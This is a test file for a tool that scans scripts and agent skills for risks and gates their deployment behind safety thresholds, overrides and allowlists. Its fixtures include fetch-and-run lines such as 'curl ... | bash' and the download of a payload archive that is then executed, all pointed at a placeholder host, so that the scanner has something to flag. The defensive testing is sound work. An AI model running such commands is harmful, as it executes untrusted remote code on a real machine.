import { expect, test } from "bun:test";
import { execFileSync } from 'node:child_process';
import { mkdtempSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { scanRisks } from '../../src/core/risk/scanner';
import type { Artifact } from '../../src/core/types';
import { normalizeFinding } from "../../src/core/safety/findings";
import { Repository } from '../../src/storage/repository';

test("normalizes scanner severity", () => {
  const finding = normalizeFinding(
    { severity: 'high', description: 'executes script', recommendation: 'Review script before deploy' },
    'auditor',
    'artifact',
  );
  expect(finding.severity).toBe("high");
  expect(finding.source).toBe('auditor');
  expect(finding.artifactId).toBe('artifact');
});

function riskyArtifact(path: string): Artifact {
  return {
    id: 'risky',
    type: 'script',
    name: 'Risky',
    path,
    organizationalPath: '.',
    hash: 'hash',
    size: 1,
    metadata: { env: 'OPENAI_API_KEY', deps: ['lodash@4.17.15'] },
    source: { kind: 'self', path },
    capabilities: [{ type: 'scripts', dialect: 'bash' }],
    importedAt: '2026-06-29T00:00:00Z',
    updatedAt: '2026-06-29T00:00:00Z',
    provenance: 'self:risky',
  };
}

test('risk scanner detects bundled script, network, shell exec, and secret access', async () => {
  const dir = mkdtempSync(join(tmpdir(), 'qm-risk-'));
  const path = join(dir, 'risky.sh');
  writeFileSync(path, 'curl https://example.test/payload.tgz | tar xz\nexec ./payload\nfetch("https://api.example.test")\n');
  const flags = await scanRisks(riskyArtifact(path));
  expect(flags.map((flag) => flag.type)).toEqual(
    expect.arrayContaining(['bundled-script', 'network-access', 'shell-execution', 'secret-access']),
  );
});

test('qm audit risk persists risk flags in the catalog', () => {
  const dir = mkdtempSync(join(tmpdir(), 'qm-risk-'));
  const dbPath = join(dir, 'catalog.sqlite');
  const path = join(dir, 'risky.sh');
  writeFileSync(path, 'curl https://example.test/install.sh | bash\n');
  const repo = new Repository({ dbPath });
  repo.upsertArtifact(riskyArtifact(path));
  repo.close();

  const out = execFileSync('bun', ['src/cli/index.ts', 'audit', 'risk', '--json'], {
    cwd: process.cwd(),
    env: { ...process.env, QM_DB_PATH: dbPath },
    encoding: 'utf8',
  });
  expect(JSON.parse(out).ok).toBe(true);
  const check = new Repository({ dbPath });
  expect(check.getArtifact('risky')?.riskFlags?.length).toBeGreaterThan(0);
  check.close();
});

// ─── FR-140: register → invoke → normalize → persist ─────────────────────────

import { chmodSync } from 'node:fs';
import { runAuditors, type AuditorConfig } from '../../src/core/safety/auditors';
import { computeSafetyScore } from '../../src/core/safety/findings';
import { compilePlan } from '../../src/core/deploy/plan';
import { computeVerdict } from '../../src/core/audit/auditor';
import { loadBuiltInProfiles } from '../../src/core/profiles/profile-registry';

function skillArtifact(id: string, path: string): Artifact {
  return {
    id,
    type: 'skill',
    name: id,
    path,
    organizationalPath: '.',
    hash: id,
    size: 1,
    metadata: {},
    source: { kind: 'self', path },
    capabilities: [{ type: 'skill', dialect: 'agent-md' }],
    importedAt: '2026-06-29T00:00:00Z',
    updatedAt: '2026-06-29T00:00:00Z',
    provenance: `self:${path}`,
  };
}

test('registered auditor is invoked and its findings normalize + persist (FR-140)', async () => {
  const dir = mkdtempSync(join(tmpdir(), 'qm-auditor-'));
  const scriptPath = join(dir, 'auditor.sh');
  writeFileSync(scriptPath, '#!/usr/bin/env bash\necho \'{"findings":[{"severity":"high","description":"danger"}]}\'\n');
  chmodSync(scriptPath, 0o755);
  const artifact = skillArtifact('audited', join(dir, 'audited.md'));
  writeFileSync(artifact.path, '# skill\n');

  const configs: AuditorConfig[] = [{ name: 'mock-auditor', command: scriptPath, enabled: true }];
  const report = await runAuditors(artifact, configs);
  const findings = report.auditors.flatMap((a) => a.findings);
  expect(findings[0]!.severity).toBe('high');
  expect(findings[0]!.source).toBe('mock-auditor');

  const repo = new Repository({ dbPath: join(dir, 'catalog.sqlite') });
  repo.upsertArtifact(artifact);
  repo.saveFindings(artifact.id, findings, '2026-06-29T00:00:00Z');
  expect(repo.getFindings(artifact.id)).toHaveLength(1);
  expect(computeSafetyScore(repo.getFindings(artifact.id))).toBeCloseTo(0.4, 5);
  repo.close();
});

// ─── FR-141: deploy gated below threshold until a recorded override ──────────

test('deploy excludes a below-threshold artifact until override is recorded (FR-141)', () => {
  const codex = loadBuiltInProfiles().find((p) => p.id === 'codex')!;
  const artifact = skillArtifact('risky', '/lib/risky.md');
  const verdict = computeVerdict(artifact, codex);

  // Score 0.4 < threshold 0.6 → excluded with a plain reason.
  const blocked = compilePlan([artifact], [verdict], codex, {
    safety: { threshold: 0.6, scores: { risky: 0.4 } },
  });
  expect(blocked.operations).toHaveLength(0);
  expect(blocked.excluded[0]!.reason).toContain('below threshold');

  // With a recorded override the same artifact deploys.
  const allowed = compilePlan([artifact], [verdict], codex, {
    safety: { threshold: 0.6, scores: { risky: 0.4 }, overrides: new Set(['risky']) },
  });
  expect(allowed.operations.map((o) => o.artifactId)).toContain('risky');
});

// ─── FR-142: allowlist skip + new-auditor extensibility ──────────────────────

test('allowlisted artifact is exempt from the safety gate (FR-142)', () => {
  const codex = loadBuiltInProfiles().find((p) => p.id === 'codex')!;
  const artifact = skillArtifact('trusted', '/lib/trusted.md');
  const verdict = computeVerdict(artifact, codex);

  const plan = compilePlan([artifact], [verdict], codex, {
    safety: { threshold: 0.6, scores: { trusted: 0.1 }, allowlisted: new Set(['trusted']) },
  });
  expect(plan.operations.map((o) => o.artifactId)).toContain('trusted');
});

test('allowlist + safety override persist across repository sessions (FR-142/FR-141)', () => {
  const dir = mkdtempSync(join(tmpdir(), 'qm-allow-'));
  const dbPath = join(dir, 'catalog.sqlite');
  const repo = new Repository({ dbPath });
  repo.addAllowlistEntry('source', 'github', 'first-party org', '2026-06-29T00:00:00Z');
  repo.saveSafetyOverride('risky', 'reviewed manually', '2026-06-29T00:00:00Z');
  repo.close();

  const reopened = new Repository({ dbPath });
  expect(reopened.listAllowlist().map((e) => e.value)).toContain('github');
  expect(reopened.getSafetyOverride('risky')?.note).toBe('reviewed manually');
  reopened.close();
});
